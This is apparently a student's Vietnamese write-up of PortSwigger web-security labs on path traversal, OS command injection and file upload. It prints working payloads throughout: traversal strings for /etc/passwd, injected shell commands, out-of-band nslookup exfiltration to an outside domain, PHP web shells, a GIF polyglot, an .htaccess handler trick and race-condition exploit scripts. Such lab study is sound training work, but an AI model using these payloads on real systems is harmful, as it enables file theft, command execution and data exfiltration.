# *Nguyễn Văn Thọ - Web03. Directory Traversal, Command Injection, File Upload*
<hr>

## Directory Traversal
### Bài 1: File path traversal, simple case
>![](https://i.imgur.com/spFsjkm.png)

Đề mô tả rằng trang web này sẽ chứa lỗ hổng file path traversal trong khi truy vấn hình ảnh sản phẩm. Mục tiêu là lấy nội dung file /etc/passwd thông qua lỗ hổng này.

Thử lấy link hình ảnh sản phẩm bất kỳ, ta thấy nó có dạng:
https://blabla/image?filename=16.jpg
Theo đó, trang web nhận tham số filename từ đường dẫn và tìm kiếm trong thư mục để trả về hình ảnh. Khi chỉnh sửa thành https://blabla/image?filename=../16.jpg thì trang web trả về như sau
![](https://i.imgur.com/Y8BAUAv.png)

Điều đó có nghĩa là nó không lọc qua các ký tự độc hại và vẫn truy vấn với tham số của ta. Sửa lại thành `../../../../../../etc/passwd` là ta có thể truy vấn đến file passwd, lấy được nội dung và solve bài lab
>![](https://i.imgur.com/YMHZSUd.png)

Kết quả:
>![](https://i.imgur.com/RkbBUk5.png)
<hr>

### Bài 2: File path traversal, traversal sequences blocked with absolute path bypass
>![](https://i.imgur.com/B1UftC5.png)

Ở bài lab này, ứng dụng chặn việc thực thi path traversal bằng cách filter các dấu `..`, nhưng vẫn cho phép đường dẫn tuyệt đối.
Để solve bài lab, ta chỉ cần sửa tham số filename thành `/etc/passwd` là xong
>![](https://i.imgur.com/KCaj7DH.png)

>![](https://i.imgur.com/93SO2yB.png)

<hr>

### Bài 3: File path traversal, traversal sequences stripped non-recursively
>![](https://i.imgur.com/w72MBTi.png)

Mô tả: ứng dụng lọc bỏ các ký tự truyền tải đường dẫn trước khi sử dụng để nhằm ngăn chặn path traversal.
Kiểm tra tài liệu của bài lab, em thấy 1 số ứng dụng filter path traversal bằng cách `replace('..','.')` và `replace('./','')`, kiểu filter blacklist này có thể bypass bằng cách sử dụng nested path traversal như `....` khi đi qua filter sẽ thành `..`, hoặc `.//` khi đi qua filter sẽ thành `/`. Vậy `....//` đi qua filter sẽ thành `../`
Payload
`....//....//....//....//....//etc/passwd`
>![](https://i.imgur.com/CLDbf8G.png)

<hr>

### Bài 4: File path traversal, traversal sequences stripped with superfluous URL-decode
>![](https://i.imgur.com/6JWhiMU.png)

Ở bài lab này, ứng dụng cũng thực hiện chặn các đường dẫn trong tham số trước khi thực thi chúng. Tuy nhiên challenge có hint là ứng dụng sẽ url-decode trước khi sử dụng. 
Vậy ta thử url-encode payload của ta trước.
`../../../../etc/passwd` urlencode sẽ thành `..%2F..%2F..%2F..%2Fetc%2Fpasswd`
Thử với payload này không được, em đoán các ký tự như `/%2F` sẽ bị filter trước khi urldecode.
Ta thực hiện urlencode thêm 1 bước nữa để thành
`..%252F..%252F..%252F..%252Fetc%252Fpasswd`
>![](https://i.imgur.com/vj5NnSk.png)

Em có tìm hiểu lý do double-encoding bypass được thì có kết quả như sau:
> ![](https://i.imgur.com/MP7NeKu.png)

<hr>

### Bài 5: File path traversal, validation of start of path
>![](https://i.imgur.com/BGAsoXZ.png)

Mô tả của đề cho biết rằng ứng dụng sẽ check xem đường dẫn có bắt đầu bằng 1 thư mục mặc định nào đó không, nếu không sẽ loại bỏ. Kiểm tra ta thấy thư mục là `/var/www/images/`, để bypass kiểu filter này, phần file name ta sửa thành payload traversal, ví dụ `/var/www/images/41.jpg` sẽ thành `/var/www/images/../../../etc/passwd`, như vậy ta vẫn giữ được thư mục bắt đầu nằm trong đường dẫn, mà vẫn traversal được.

Kết quả:
>![](https://i.imgur.com/L8NkYeg.png)

<hr>

### Bài 6: File path traversal, validation of file extension with null byte bypass
>![](https://i.imgur.com/9qGZdSD.png)

Đề mô tả rằng trang web sẽ validate tham số filename kết thúc với phần mở rộng file xác định, nếu sai sẽ loại bỏ.

Với các đường dẫn hình ảnh, phần mở rộng sẽ là jpg, ta cần tìm cách để đọc file /etc/password mà vẫn giữ phần mở rộng này.
Ở đây em sử dụng null byte để kết thúc chuỗi, khi ứng dụng validate thì phần extension vẫn thỏa mãn, nhưng khi truy cập tới file thì phần đường dẫn sẽ bỏ qua các ký tự sau null byte. `Null-byte injection`
>![](https://i.imgur.com/UMy4DRk.png)

Payload:
`../../../../etc/passwd%00.jpg`
>![](https://i.imgur.com/oyebYV3.png)

<hr>

<hr>
<hr>

## OS Command Injection
### Bài 1: OS command injection, simple case
>![](https://i.imgur.com/qM2ouIr.png)

Bài lab chứa lỗ hổng OS command injection trong chức năng `product stock checker`, ID của sản phẩm được gửi lên qua chức năng này, và ứng dụng thực thi 1 lệnh hệ thống với nó. Kết quả được trả về cho ngườ dùng. Mục tiêu của ta là khai thác và thực thi lệnh `whoami`.
Inspect chức năng ta thấy tham số được gửi dưới dạng option
>![](https://i.imgur.com/pjGbPuT.png)

Theo đề, ta đã biết rằng tham số này sẽ được POST lên server và được thực thi trong shell command, để escape khỏi command đó và thực thi lệnh `whoami`, ta dùng dấu `;` thay đổi giá trị của option thành `1; whoami`
Kết quả sẽ như sau
>![](https://i.imgur.com/e2VvTlR.png)

**Solve**
>![](https://i.imgur.com/5L3XVmO.png)

<hr>

### Bài 2: Blind OS command injection with time delays
>![](https://i.imgur.com/pf5KdHH.png)

Theo đề, chức năng `feedback` bị lỗi OS command injection, kết quả của câu lệnh không trả về người dùng, mục tiêu của ta chỉ là khiến trang web delay 10s trước khi phản hồi.

Trang feedback sẽ có giao diện như sau:
>![](https://i.imgur.com/txiWS2U.png)

Vì không biết được trường nào sẽ được xử lý trong shell code, nên em đặt giá trị của cả 4 trường như sau, và kết quả có thể khiến trang web delay 10s trước khi phản hồi.
>![](https://i.imgur.com/0CeKMMx.png)

Kết quả:
>![](https://i.imgur.com/jwyOmTt.png)

<hr>

### Bài 3: Blind OS command injection with output redirection
>![](https://i.imgur.com/QOcJepT.png)

Mô tả: Trang web chứa lỗ hổng OS command injection ở chức năng `feedback`, kết quả không trả về cho người dùng, tuy nhiên ta có thể chuyển hướng kết quả đến một thư mục writable `/var/www/images`, và ta sẽ thay đổi tham số filename trên URL truy vấn ảnh để đọc nội dung file.

Đầu tiên, ta khai thác như bài trên nhưng payload sẽ là `; whoami > /var/www/images/exploit ;` để ghi kết quả vào file 'exploit' trong thư mục `/var/www/images`

Tại đường dẫn hình ảnh, ta thay thế tham số filename thành exploit như sau: https://blalba/image?filename=exploit
Kết quả đọc được nội dung trả về của lệnh `whoami`
>![](https://i.imgur.com/9GkWJoc.png)
>![](https://i.imgur.com/PSbJTul.png)

<hr>

### Bài 4: Blind OS command injection with out-of-band interaction
>![](https://i.imgur.com/1SEc78H.png)

Bài này không trả kết quả command về người dùng, cũng không có thư mục nào có thể ghi file, đòi hỏi ta chuyển hướng kết quả lên `DNS lookup`, thực hiện một cuộc khai thác `out-of-band`

Ý tưởng là ta sẽ sử dụng lệnh `nslookup` tới domain của ta 
Payload 
`; nslookup e7msbjin6a0iov44dyfmzxm6qxwnkc.oastify.com ;` (domain của ta)
Kết quả:
>![](https://i.imgur.com/Q0JQUH2.png)
>![](https://i.imgur.com/NXiuoKA.png)

<hr>

### Bài 5: Blind OS command injection with out-of-band data exfiltration
>![](https://i.imgur.com/rVnLOJz.png)

Bài này cũng giống bài trên, chỉ khác là ta sẽ nhúng kết quả câu lệnh vào DNS query dưới dạng subdomain.
Payload sẽ như thế này.
`; nslookup ${whoami}.ovn2zt6xukosc5se183wn7age7ky8n.oastify.com;` (phía sau là domain của ta)
Kết quả:
>![](https://i.imgur.com/tMu29qm.png)

**solved**
>![](https://i.imgur.com/t78GnpV.png)

<hr>
<hr>

## Directory Traversal
### Bài 1: Remote code execution via web shell upload
>![](https://i.imgur.com/oc8VEc9.png)

Mô tả nói rằng trang web bị lỗ hổng file upload ở chúc năng upload avatar. 
Ta thử viết 1 file php có nội dung như sau
```php
<?php
echo file_get_contents("/home/carlos/secret");
?>
```
Upload file lên và truy cập tới file thông qua đường dẫn của avatar, ta thấy trả về là nội dung của file `secret` như sau:
>![](https://i.imgur.com/DxouSIY.png)

Submit nội dung này là ta solve bài lab
>![](https://i.imgur.com/YnruuSF.png)

<hr>

### Bài 2: Web shell upload via Content-Type restriction bypass
>![](https://i.imgur.com/n9hnVaf.png)

Mô tả: Ở bài này, trang web chặn upload 1 số filetype thông qua các tham số mà người dùng có thể kiểm soát (có thể là file extension, filename, Content-Type...)
Để bypass, ta sẽ dùng Burp Suite Proxy thay thế các trường này để trông nó giống như 1 file ảnh bình thường.
Đầu tiên tạo 1 file php giống như bài trên, sau đó dùng Burp Proxy thay thế Content-Type như sau
>![](https://i.imgur.com/nNvt1U1.png)

Sửa Content-Type thành `image/png` và submit thì thấy có thể upload file được.

Mở file thông qua đường dẫn của avatar, ta thấy secret, submit là ta solve bài lab
>![](https://i.imgur.com/ePd0Vnp.png)

<hr>

### Bài 3: Web shell upload via path traversal
>![](https://i.imgur.com/zXFkNVt.png)

Đề mô tả rằng trang web ngăn chặn thực thi file, và mục tiêu của ta là chain với `secondary vulnerability` để thực thi được file. 
Ở đây em đoán là server cấu hình không cho thực thi file ở thư mục upload, nên ta sẽ kết hợp với path traversal, chuyển tên file từ `exp.php` thành `../exp.php` để lưu file exploit ở thư mục cha, lúc đó có thể thực thi.

Đầu tiên ta tạo 1 file shell php như 2 bài trên
sau đó upload và dùng Burp Suite Proxy để sửa trường filename thành `../exp.php`
>![](https://i.imgur.com/dSfOxE5.png)

Quan sát kết quả trả về ta thấy server đã lọc qua các ký tự path traversal và vẫn lưu ở thư mục hiện tại
>![](https://i.imgur.com/hoQazXu.png)

Thử lại với filename=`..%2fexp.php`, ta có kết quả như sau, nghĩa là đã có thể lưu ở thư mục cha của thư mục avatar
>![](https://i.imgur.com/9RiJMCu.png)

Truy cập vào đường dẫn file, ta lấy được secret, submit là ta có thể solve
>![](https://i.imgur.com/Gh11HvY.png)

>![](https://i.imgur.com/UBSLQ4v.png)

<hr>

### Bài 4: Web shell upload via extension blacklist bypass
>![](https://i.imgur.com/aWDX64c.png)

Mô tả: ứng dụng web này có 1 blacklist các loại file được phép upload, nhưng tồn tại lỗ hổng trong danh sách này.
Thử với file PHP em thấy server đã chặn upload nó
>![](https://i.imgur.com/4BvD1YI.png)
>
**Cách 1:**
Tìm kiếm google, em thấy ta có thể sử dụng `Polyglot file`
>![](https://i.imgur.com/1vEYc4L.png)

Cụ thể, nó là loại file thỏa nhiều định dạng typefile khác nhau. Phar file sẽ cho phép upload 1 file php, nhưng sẽ được coi như file JPEG
Thử đổi tên file thành `exp.phar` và thử lại em thấy upload thành công. Mở file ta thu được secret và solve bài lab
>![](https://i.imgur.com/euDn8tH.png)

Solve
>![](https://i.imgur.com/U7oCr5S.png)

**Cách 2:**
Bên cạnh cách dùng phar file, em tìm thêm được một cách khác là sửa đổi cấu hình server Apache thông qua upload file `.htaccess`
```
AddType application/x-httpd-php .abc
```

Câu lệnh này map các file có phần extension `.abc` sang dạng executable `.php`
Sau khi upload file .htaccess với nội dung như vậy lên, ta tiếp tục tạo 1 file php với nội dung như các bài trước, sau đó đổi file extension từ `.php` sang `.abc`. Upload file này lên, nó sẽ được server xử lý như 1 file php và execute đoạn code bên trong. 
Truy vấn tới đường dẫn file, ta có nội dung của nó
>![](https://i.imgur.com/mNuGd24.png)

<hr>

### Bài 5: Web shell upload via obfuscated file extension
>![](https://i.imgur.com/irdbNr4.png)

Mô tả: Bài này cũng giống bài trên, mô tả đề giống bài trên, khai thác giống cách 1 của bài trên. Tuy nhiên khi upload phar file lên ta nhận được thông báo như sau:
>![](https://i.imgur.com/14r8HFM.png)

Dựa vào các bài lab trên, ta thử đổi content-type ta thấy vẫn chưa bypass được, ta đổi tiếp filename thành `exp.phar%00.png` thì thấy upload được
>![](https://i.imgur.com/1zAuQSO.png)

Mở file ta thấy đọc được nội dung file `secret`, submit ta solve được bài lab.
>![](https://i.imgur.com/kWWn1M6.png)

<hr>

### Bài 6: Remote code execution via polyglot web shell upload
>![](https://i.imgur.com/KaOOdAt.png)

Bài lab này, ứng dụng đã check kĩ nội dung file để đảm bảo file chắc chắn là file ảnh, tuy nhiên vẫn có thể khai thác.
Kiểm tra thì em thấy nó chỉ check nội dung file, chứ không check extension.
Đầu tiên tạo 1 file php để đọc file secret như các bài trên, tuy nhiên, cần sửa lại dòng đầu tiên của file là `GIF89a` rồi mới tới payload của ta
```php
GIF89a
<?php
echo file_get_contents("/home/carlos/secret");
?>
```
Đây là 1 signature format của file gif, mọi file gif (có animation) đều có header này, ta lợi dụng đó để thêm vào nội dung file đánh lừa cơ chế kiểm tra của server
Upload lên ta thu được kết quả như sau
>![](https://i.imgur.com/omLDFZB.png)

Mở file ta thu được secret
>![](https://i.imgur.com/PSjy3QO.png)

Kết quả cuối cùng
>![](https://i.imgur.com/pXXoKsb.png)

<hr>

### Bài 7: Web shell upload via race condition
> ![](https://i.imgur.com/AEI4Bg1.png)

Mô tả: trang web validate rất kĩ các file upload lên, nhưng vẫn có thể bị bypass bằng race condition

Cụ thể về tấn công race condition, em tìm thấy ví dụ như sau:
>![](https://i.imgur.com/dDuMrnG.png)

Cụ thể trong thời gian server validate file của ta, nó đã lưu file trong hệ thống, chỉ vài milisecond cũng đủ cho ta truy cập và thực thi file đó.

Bài lab cung cấp đoạn code xử lý file upload lên như sau:
```php
<?php
$target_dir = "avatars/";
$target_file = $target_dir . $_FILES["avatar"]["name"];

// temporary move
move_uploaded_file($_FILES["avatar"]["tmp_name"], $target_file);

if (checkViruses($target_file) && checkFileType($target_file)) {
    echo "The file ". htmlspecialchars( $target_file). " has been uploaded.";
} else {
    unlink($target_file);
    echo "Sorry, there was an error uploading your file.";
    http_response_code(403);
}
```
Mục tiêu của ta là viết mã khai thác để tranh thủ thời gian `checkViruses` ta đọc file và lấy nội dung.
Ta tạo script tự động POST file php của ta lên, sau đó gửi liên tục GET request tới file đó, trước khi server xử lý xong.
Ở đây em dùng extension `Turbo Intruder` để thực hiện tự động việc đó. Payload như sau: (có kèm giải thích code)

```python
# Default script ở https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10,)
     #request1 is my POST request with php file
    request1 = '''
POST /my-account/avatar HTTP/1.1
Host: 0a0200a5048c2b2cc2d111ae00c600d2.web-security-academy.net
Cookie: session=AWH7DY2FXuyfcjTPBuMZ4cdUzG0wcPQB
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------330791307811450659691420606466
Content-Length: 549
Origin: https://0a0200a5048c2b2cc2d111ae00c600d2.web-security-academy.net
Dnt: 1
Referer: https://0a0200a5048c2b2cc2d111ae00c600d2.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------330791307811450659691420606466
Content-Disposition: form-data; name="avatar"; filename="exp.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>

-----------------------------330791307811450659691420606466
Content-Disposition: form-data; name="user"

wiener
-----------------------------330791307811450659691420606466
Content-Disposition: form-data; name="csrf"

MnAk4pu8ffIIMhtrA7QplX4snjgTUy1R
-----------------------------330791307811450659691420606466--

'''
    #request2 is my GET request to that php file
    request2 = '''
GET /files/avatars/exp.php HTTP/1.1
Host: 0a0200a5048c2b2cc2d111ae00c600d2.web-security-academy.net
Cookie: session=AWH7DY2FXuyfcjTPBuMZ4cdUzG0wcPQB
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close

'''

    #add request1 and five request2 to queue
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')

    # start to exploit by execute queue of requests
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)
```
Kết quả ta thu được các GET request với status code 200, tức nó có thể thành công thực thi file php và trả về kết quả cho ta trong thời gian server đang xử lý file. Có được secret
>![](https://i.imgur.com/ZhNAXoa.png)

Submit secret và solve bài lab
>![](https://i.imgur.com/HxJ22XF.png)

**Bonus cript python request racing**
Em sử dụng code request_racer ở repo: https://github.com/nccgroup/requests-racer
Sửa lại tham số `num_chunk` trong file `core.py` của nó thành 1
Và script của em như sau
```python
import requests
from requests_racer import SynchronizedSession
import html2text

s = SynchronizedSession(num_threads=2)
url = "https://0aea001004f9aaaec07aa98800d700d7.web-security-academy.net/"
file = { "avatar" : open('exp.php','rb')}
cookie = {
    "session" : "phYQ9TggcTad5i8qJuyqOzDxJhktb6wm"
}
data = {
    "csrf" :"eoowJPdrhCdKPUeN69ACrb7lvEYIBure",
    "user" : "wiener"
}

r1 = s.post(url=url +"my-account/avatar", files=file, data=data, cookies=cookie)
r2 = s.get(url=url+ "files/avatars/exp.php", cookies=cookie)

s.finish_all()
print(r1.status_code)
print(html2text.html2text(r2.text))
```

Có thể 1 số lần racing không thành công, thử lại thêm sẽ thấy có kết quả
<hr>
